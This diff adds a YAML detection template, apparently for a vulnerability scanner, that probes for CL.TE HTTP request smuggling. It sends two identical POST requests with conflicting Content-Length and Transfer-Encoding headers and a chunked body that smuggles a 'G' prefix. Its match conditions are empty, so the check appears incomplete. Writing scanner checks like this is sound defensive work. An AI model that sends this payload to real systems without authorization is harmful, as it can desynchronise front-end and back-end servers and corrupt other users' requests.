@@ -1,0 +1,36 @@
+id: cl-te-http-smuggling
+brief:
+    title: Basic CL.TE - HTTP request smuggling
+    by: pdteam
+    level: low
+    about: Detected a potential CL.TE request smuggling condition where conflicting Content-Length and Transfer-Encoding headers caused the gateway and backend to parse requests differently.
+    label:
+        - cl-te
+        - smuggling
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Connection: keep-alive
+        Content-Length: "6"
+        Content-Type: application/x-www-form-urlencoded
+        Transfer-Encoding: chunked
+      body: |-
+        0
+
+        G
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Connection: keep-alive
+        Content-Length: "6"
+        Content-Type: application/x-www-form-urlencoded
+        Transfer-Encoding: chunked
+      body: |-
+        0
+
+        G
+      signs: []
